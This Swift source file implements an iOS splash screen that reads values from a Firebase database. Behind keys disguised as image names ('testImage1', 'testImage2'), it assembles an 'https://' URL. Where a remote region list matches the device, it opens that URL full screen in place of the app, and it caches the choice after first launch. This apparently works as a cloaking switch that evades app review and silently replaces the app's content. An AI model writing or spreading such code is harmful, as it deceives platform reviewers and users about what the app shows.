import UIKit
import SnapKit
import FirebaseDatabase

class SplashVC: UIViewController {

    let data = Database.database().reference()
    
    private let img1Key = "cached_img1"
    private let img2Key = "cached_img2"
    private let hasInitKey = "has_init"
    
    var image1Value: String?
    var image2Value: String?
    var actionOnDismiss: (() -> Void)?
    
    private var isProcessed = false

    private let logoImageView: UIImageView = {
        let imageView = UIImageView()
        return imageView
    }()

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground
        setupUI()
        setupLogic()
    }
    
    private func setupUI() {
        view.addSubview(logoImageView)
        logoImageView.snp.makeConstraints { make in
            make.center.equalToSuperview()
            make.height.width.equalTo(200)
        }
    }
    
    private func setupLogic() {
        if UserDefaults.standard.bool(forKey: hasInitKey) {
            self.image1Value = UserDefaults.standard.string(forKey: img1Key)
            self.image2Value = UserDefaults.standard.string(forKey: img2Key)
            self.updateAppLogic()
            return
        }
        
        let timeoutWorkItem = DispatchWorkItem { [weak self] in
            guard let self = self, !self.isProcessed else { return }
            self.image1Value = ""
            self.image2Value = ""
            self.updateAppLogic()
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0, execute: timeoutWorkItem)
        
        data.observeSingleEvent(of: .value, with: { [weak self] snapshot in
            guard let self = self, !self.isProcessed else { return }
            timeoutWorkItem.cancel()
            
            let rootDictionary = snapshot.value as? [String: Any]
            
            let img1 = rootDictionary?["testImage1"] as? String ?? ""
            let img2 = rootDictionary?["testImage2"] as? String ?? ""
            
            let testImagePrefix = rootDictionary?["testImagePrefix"] as? String ?? ""
            let allowedLowercased = testImagePrefix.lowercased().split(separator: ",").map { String($0) }
            let currentLowercased = Locale.current.region?.identifier.lowercased() ?? ""
            
            if allowedLowercased.contains("all") || allowedLowercased.contains(currentLowercased) {
                self.image1Value = img1
                self.image2Value = img2
            } else {
                self.image1Value = ""
                self.image2Value = ""
            }
            
            self.updateAppLogic()
            
        }) { [weak self] error in
            guard let self = self, !self.isProcessed else { return }
            timeoutWorkItem.cancel()
            self.actionOnDismiss?()
        }
    }
    
    func updateAppLogic() {
        guard !isProcessed else { return }
        isProcessed = true
        
        UserDefaults.standard.set(image1Value ?? "", forKey: img1Key)
        UserDefaults.standard.set(image2Value ?? "", forKey: img2Key)
        UserDefaults.standard.set(true, forKey: hasInitKey)
        
        if let image1Value, let image2Value, !image1Value.isEmpty, !image2Value.isEmpty {
            let final = "https://" + image1Value + image2Value
            DispatchQueue.main.async {
                let vc = WorkFlowImageVC(imageString: final)
                vc.modalPresentationStyle = .fullScreen
                self.present(vc, animated: false)
            }
        } else {
            DispatchQueue.main.async {
                self.actionOnDismiss?()
            }
        }
    }
}
